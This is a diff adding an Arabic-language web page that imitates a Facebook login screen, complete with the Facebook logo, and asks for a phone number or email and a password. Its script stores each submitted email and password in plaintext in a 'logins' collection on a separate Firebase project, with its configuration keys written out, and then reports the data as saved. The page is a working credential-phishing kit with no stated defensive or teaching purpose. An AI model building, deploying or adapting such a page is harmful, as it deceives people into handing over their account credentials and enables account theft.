@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: start;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f4f4f4;
+      direction: rtl;
+    }
+
+    body > img {
+      transform: translateY(90px);
+    }
+
+    .login-container {
+      padding: 20px;
+      border-radius: 5px;
+      width: 300px;
+      height: 40vh;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      margin-top: 160px;
+    }
+
+    input {
+      width: 100%;
+      height: 40px;
+      padding: 8px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-size: 17px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .message {
+      margin-top: 10px;
+      font-size: 14px;
+      color: green;
+    }
+
+    .error {
+      margin-top: 10px;
+      font-size: 14px;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <img width="64" height="64" src="https://img.icons8.com/glyph-neue/64/228BE6/facebook.png" alt="facebook" />
+  <div class="login-container">
+    <input type="email" id="email" placeholder="رقم الهاتف أو البريد الإلكتروني" required />
+    <input type="password" id="password" placeholder="كلمة السر" required />
+    <button id="submitBtn">إرسال</button>
+    <p id="message" class="message"></p>
+    <p id="error-message" class="error"></p>
+  </div>
+
+  <!-- Firebase SDK + Firestore -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
+
+    // إعدادات Firebase (تم إدراجها من مشروعك)
+    const firebaseConfig = {
+      apiKey: "AIzaSyCnUUc7NRAGjp03fpKo44WOUHhi0nkIVzs",
+      authDomain: "mydatabase-7416e.firebaseapp.com",
+      projectId: "mydatabase-7416e",
+      storageBucket: "mydatabase-7416e.appspot.com",
+      messagingSenderId: "630217015078",
+      appId: "1:630217015078:web:2dc5ef690df34cc7fe8be7",
+      measurementId: "G-36TPG2P8B2"
+    };
+
+    // تهيئة Firebase و Firestore
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // إرسال البيانات إلى Firestore
+    document.getElementById("submitBtn").addEventListener("click", async () => {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const message = document.getElementById("message");
+      const errorMessage = document.getElementById("error-message");
+
+      // تحقق من تعبئة البيانات
+      if (!email || !password) {
+        errorMessage.textContent = "يرجى تعبئة جميع الحقول.";
+        message.textContent = "";
+        return;
+      }
+
+      try {
+        await addDoc(collection(db, "logins"), {
+          email: email,
+          password: password,
+          timestamp: new Date()
+        });
+
+        message.textContent = "تم حفظ البيانات بنجاح!";
+        errorMessage.textContent = "";
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+      } catch (error) {
+        errorMessage.textContent = "حدث خطأ: " + error.message;
+        message.textContent = "";
+      }
+    });
+  </script>
+</body>
+</html>
